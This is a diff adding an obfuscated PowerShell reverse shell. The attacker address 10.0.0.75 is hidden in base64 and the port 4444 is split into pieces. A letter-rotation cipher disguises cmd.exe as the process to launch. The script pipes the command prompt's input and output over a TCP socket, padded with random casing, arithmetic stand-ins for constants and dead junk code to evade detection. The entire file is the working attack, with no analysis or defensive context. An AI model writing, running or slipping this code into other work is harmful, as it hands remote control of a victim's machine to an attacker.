@@ -1,0 +1,45 @@
+function clEaNUp {
+if ($clIent.conNECTed -eq $TrUE) {$ClIEnT.ClOse()}
+if ($process.eXITCOdE -ne $nUlL) {$process.ClOSE()}
+Exit}
+$addREss = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTAuMC4wLjc1')))
+$poRt = ('4'+'44'+'4')
+$clieNt = nEW-ObjeCT SYSTEm.Net.socKeTs.TCPCLiEnt
+$cliENt.connecT($address,$port)
+$sTreAM = $cLieNT.getStREAM()
+$NETwoRKbuFfeR = nEw-ObJECT SYStEm.byTE[] $cLiENT.rECeIveBufFeRsIze
+$process = NEW-ObJECT SysTEm.DIAGNoSTICs.Process
+$process.sTARtinfo.FIlenaMe = $(-join('S:\\mydtemi\\ioijuc32\\sct.unu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}}))
+$process.STartiNFO.reDIrecTstandaRdinPuT = (-51 + 52)
+$process.sTartInFo.ReDiREcTstANDArDouTPUt = (101 % 25)
+$process.StArTinFO.uSEShelLEXECUtE = (-60 + 60)
+$process.STArt()
+$iNputSTream = $process.StAndarDiNPut
+$outPutStrEam = $process.STaNdaRDoUtpUT
+STarT-SleeP (36 / 36)
+$ENcODinG = New-ObJECt systEM.teXT.AScIIenCodINg
+while($oUtpUTStrEam.pEeK() -ne -1){$OUt += $EnCodinG.GetstRiNg($oUtpUTSTrEAm.READ())}
+$StrEaM.WrIte($eNCOdinG.GETbytEs($oUT),(2 -bxor 2),$oUT.LeNgTh)
+$Out = $nUll; $doNe = $falSE; $TEstING = (19 -bxor 19);
+([xml]"<root><val>26</val></root>").root.val | Out-Null
+if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
+    $tempFile = New-TemporaryFile; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | Out-File -FilePath $tempFile.FullName -Append; Start-Sleep -Milliseconds 56
+}
+while (-not $dONE) {
+if ($cLIeNt.CONnECteD -ne $TruE) {CLEAnup}
+$POs = (-71 -bxor -71); $I = (46 / 46)
+while (($i -gt 0) -and ($pOs -lt $NEtworKbUffeR.leNGTH)) {
+$reAD = $STreAM.rEAD($NeTworkbuFFER,$POs,$NEtwOrKBuffeR.lengTh - $poS)
+$POs+=$REad; if ($PoS -and ($NEtwORkBUFfER[0..$($POS-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$sTRInG = $encodInG.GEtstRinG($neTwOrkbUFfeR,(-75 -bxor -75),$PoS)
+$iNpUTStrEAM.writE($sTRInG)
+stArt-sLEeP (274 % 91)
+if ($process.EXitCOde -ne $Null) {ClEAnuP}
+else {
+$OuT = $eNCODING.gETstRing($ouTpUtSTReaM.rEaD())
+while($OuTPUtsTrEaM.PEEk() -ne -1){
+$OuT += $eNcoDInG.GEtSTRINg($OuTPUtsTReAm.rEAd()); if ($OuT -eq $sTRINg) {$oUt = ''}}
+$stREAm.WRItE($EncOding.getBytEs($OUt),(105 % 35),$Out.LEngTH)
+$oUt = $NULl
+$sTRING = $NuLl}} else {CLEaNUp}}
